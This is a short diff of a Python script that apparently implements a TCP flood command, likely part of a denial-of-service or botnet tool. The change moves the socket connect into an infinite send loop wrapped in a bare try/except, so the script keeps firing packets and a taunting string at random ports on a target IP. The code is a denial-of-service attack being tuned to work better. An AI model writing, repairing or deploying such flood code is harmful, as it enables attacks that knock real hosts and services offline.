@@ -79,12 +79,15 @@ def system():
 
 							tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-							tcpflood.connect((ip, 80))
 
 							print("Command Accepted!")
 							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
 
 							while True:
+								try:
+									tcpflood.connect((ip, 80))
+								except:
+									pass
 								port = random.randint(1, 65535)
 								tcpflood.sendto(package, (ip, port))
 								tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
